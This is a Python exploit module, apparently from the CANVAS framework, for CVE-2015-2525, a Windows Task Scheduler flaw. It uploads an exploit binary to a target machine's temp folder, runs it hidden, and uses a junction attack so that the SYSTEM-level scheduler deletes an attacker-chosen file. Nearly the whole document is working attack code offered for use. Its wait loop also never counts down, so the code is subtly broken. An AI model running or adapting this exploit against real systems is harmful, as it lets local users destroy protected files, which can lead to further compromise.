#!/usr/bin/env python

import os
import sys
import random
import logging

from time import sleep

if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from ExploitTypes.windowsLocalExploit import WindowsLocalExploit

NAME                           = 'Windows Task Arbitrary File Deletion'
DESCRIPTION                    = 'Windows Task Arbitrary File Deletion'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Microsoft'
DOCUMENTATION['Repeatability'] = 'Infinite'
DOCUMENTATION['CVE Name']      = 'CVE-2015-2525'
DOCUMENTATION['CVE Url']       = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2525'
VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Windows'] ]
PROPERTY['VERSION']            = ['7 SP1']

DOCUMENTATION['Notes']         = """
This module exploits a vulnerability on the Task Scheduler Service (schedsvc.dll).
When a scheduled task is created with the DeleteExpiredTaskAfter (https://msdn.microsoft.com/en-us/library/windows/desktop/aa381847(v=vs.85).aspx) property set, the Task Scheduler will wait that amount of time before deleting the task and its related file. The problem arises because the service deletes the file (through a DeleteFile call) on a callback thread running as local system.
Therefore a junction attack can be mounted against the deletion process. Giving the attacker the primitive to delete any file on the system which local system can delete.

References:
https://technet.microsoft.com/en-us/library/security/ms15-102.aspx

Tested on:
    Windows 8.1 Enterprise x86
    Windows 7 Ultimate SP1 x86
    Windows 7 Professional SP1 x64
"""

CHANGELOG = """
"""

targets = {
    0: ['Autodetect', [0, 0, 0, 0]]
}


class theexploit(WindowsLocalExploit):
    def __init__(self):
        WindowsLocalExploit.__init__(self)
        self.name           = NAME
        self.node           = None
        self.local_res      = os.path.join(os.path.dirname(__file__), 'Resources')
        self.remote_path    = '%TMP%\\' # remote base path
        self.remote_name    = '%s.exe' % random.randint(0, 1000)
        self.remote_exp     = ''
        self.targetFile     = ''

    def spawn_exploit(self, arg1):
        try:
            dst = os.path.join(self.remote_path, self.remote_name)
            cmd_line = dst + ' ' +  arg1
            ret = self.node.shell.CreateProcessA(cmd_line,
                                                 inherithandles = 1,
                                                 dwCreationFlags = 0x08000000)
        except Exception, ex:
            logging.error('%s' % ex)
            return False

        return ret

    def file_exists(self, filepath):
        try:
            (ret, s, c, f) = self.node.shell.dostat(filepath)
            if ret == -1:
                return 0
        except Exception, ex:
            logging.error('Error: %s' % ex)
            return 0

        return 1

    def run(self):
        for node in self.argsDict['passednodes']:
            self.node = node
            self.summary[node] = 0

            self.local_name = 'exploit.exe'
            self.local_exp  = os.path.join(self.local_res, self.local_name)

            self.remote_path = self.node.shell.GetTempPathA()
            if not self.remote_path:
                logging.error('Could not resolve full temp dir path')
                continue
            else:
                logging.info('Temp dir: %s' % self.remote_path)
                self.remote_exp = os.path.join(self.remote_path, self.remote_name)

            if self.node.shell.chdir(self.remote_path) < 0:
                logging.error('Could not chdir into %s' % self.remote_path)
                continue

            # upload binaries
            if not self.nodeUpload(self.local_exp, self.remote_exp):
                logging.error('Error while uploading exploit binary')
                continue

            self.add_file_for_cleanup(self.remote_exp)

            # spawn exploit
            targetFile  = self.argsDict.get('targetFile', self.targetFile)
            if self.file_exists(targetFile):
                arg1 = '%s' % targetFile
                if not self.spawn_exploit(arg1):
                    logging.error('Could not spawn %s' % NAME)
                    continue

                logging.info("Waiting for the exploit to complete...")
                wait = 15
                while wait:
                    sleep(1)
                    if not self.file_exists(targetFile):
                        self.summary[node] = 1
                        break
            else:
                logging.warning('File %s does not exist' % targetFile)

        return 1


if __name__ == '__main__':
    print 'Running CANVAS %s Exploit v %s' % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
